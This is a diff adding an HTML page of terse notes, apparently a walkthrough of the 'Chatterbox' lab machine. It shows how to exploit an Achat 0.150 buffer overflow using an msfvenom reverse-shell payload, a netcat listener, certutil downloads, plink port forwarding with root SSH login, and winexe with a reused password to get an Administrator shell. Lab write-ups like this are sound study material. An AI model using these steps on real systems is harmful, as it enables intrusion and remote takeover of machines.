@@ -1,0 +1,52 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Chatterbox</title>
+</head><body><span style="font-size: 16pt">Windows 8 machine<br/>
+<br/>
+</span><span style="font-size: 16pt">searchsploit achat</span><ul><span style="font-size: 16pt"><li style="list-style-type: none">&gt; Achat 0.150 beta7 - Remote Buffer Overflow   | windows/remote/36025.py</li>
+</span></ul>
+<span style="font-size: 16pt">Take this script and alter the shellcode.<br/>
+<br/>
+Altering the shellcode by creating a new msfvenom output<ul><li style="list-style-type: none">&gt; msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.191 LPORT=444 -e x86/unicode_mixed -b '&lt;insert orginal shellcode&gt;' BufferRegister=EAX -f python</li>
+</ul>
+<br/>
+</span><span style="font-size: 16pt">start nc listener</span><ul><li style="list-style-type: none"><span style="font-size: 16pt">&gt; nc -nlvp 444</span></li>
+<li style="list-style-type: none"/>
+<span style="font-size: 14pt"><li style="list-style-type: none">---------------YOU GET A SHELL---------------</li>
+</span></ul>
+<img height="300" src="image.png" width="400"/><br/>
+<span style="font-size: 14pt">Alfred's password = Welcome1!<br/>
+<br/>
+Using Welcome1!<br/>
+<br/>
+<br/>
+</span><span style="font-size: 16pt">Plink.exe  &lt;--- used for port forwarding</span><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html"><span style="font-size: 14pt">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</span></a><span style="font-size: 14pt"><ul><li style="list-style-type: none">Command line interface to <b>putty</b>(connecto to servers interface)</li>
+</ul>
+<br/>
+</span><span style="font-size: 14pt">UPDOG plink.exe to download on server</span><ul><span style="font-size: 12pt"><li style="list-style-type: none">Download it on windows</li>
+</span><li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 12pt">&gt; certutil -url cache -f &lt;link&gt; &lt;name the file&gt;</span></li>
+<span style="font-size: 14pt"><li style="list-style-type: none">=====Creating the Port Forward=====</li>
+</span></ul>
+</li>
+</ul>
+<span style="font-size: 14pt">Change setting in ssh config</span><ul><span style="font-size: 14pt"><li style="list-style-type: none">&gt; nano /etc/ssh/sshd_config</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">Uncomment &gt;&gt;&gt; <b>PermitRootLogin prohibit-password</b></li>
+<li style="list-style-type: none">change to &gt;&gt;&gt;&gt;&gt;&gt;&gt; <b>PermitRootLogin yes</b></li>
+</span><li style="list-style-type: none"><span style="font-size: 14pt">***Allows us to connect to our machine from the windows as root***</span></li>
+<span style="font-size: 12pt"><li style="list-style-type: none"/>
+</span></ul>
+<span style="font-size: 14pt">Connect from Windows machine with Plink<br/>
+windows&gt; plink.exe -l root -pw toor -R 445:127.0.0.1:445 &lt;your ip&gt;<ul><li style="list-style-type: none"><span style="font-size: 12pt">Understand that you are portfowarding that first IP </span></li>
+</ul>
+=====Connect to your machine======<br/>
+<br/>
+<br/>
+==========================================================<br/>
+<br/>
+<span style="font-size: 16pt">**ONLY WORKS WITH CRED LEAK**</span><br/>
+<br/>
+</span><span style="font-size: 14pt">Use tool winexe to gain a shell back from the ssh</span><ul><span style="font-size: 12pt"><li style="list-style-type: none">&gt; winexe -U Administrator%&lt;Password&gt; //127.0.0.1 &quot;cmd.exe&quot;</li>
+</span></ul>
+</body></html>
